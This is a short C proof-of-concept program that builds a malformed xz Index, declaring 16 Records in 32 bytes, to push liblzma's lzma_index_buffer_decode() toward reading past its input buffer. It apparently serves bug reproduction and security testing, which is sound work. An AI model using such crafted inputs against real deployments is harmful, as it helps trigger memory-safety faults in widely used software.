// SPDX-License-Identifier: 0BSD
//
// PoC input for lzma_index_buffer_decode(): an in-contract single-call
// decode where decoding starts at *in_pos = 32 into a 64-byte buffer.
// The Index in the remaining 32 bytes declares 16 Records, which is more
// than what the 32 remaining bytes can hold, so the decoder wants to
// keep reading past the end of the input buffer.

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <lzma.h>


int
main(void)
{
	uint8_t *buf = malloc(64);
	if (buf == NULL)
		return 1;

	memset(buf, 0, 64);

	// The Index field starts at byte 32 of the buffer.
	uint8_t *index = buf + 32;
	index[0] = 0x00; // Index Indicator
	index[1] = 0x10; // Number of Records = 16
	for (size_t k = 0; k < 15; ++k) {
		index[2 + 2 * k] = 0x06; // Unpadded Size = 6
		index[3 + 2 * k] = 0x00; // Uncompressed Size = 0
	}

	uint64_t memlimit = UINT64_MAX;
	size_t in_pos = 32;
	lzma_index *idx = NULL;

	const lzma_ret ret = lzma_index_buffer_decode(&idx, &memlimit,
			NULL, buf, &in_pos, 64);

	printf("lzma_index_buffer_decode() returned %d, in_pos = %zu\n",
			(int)ret, in_pos);

	lzma_index_end(idx, NULL);
	free(buf);
	return 0;
}
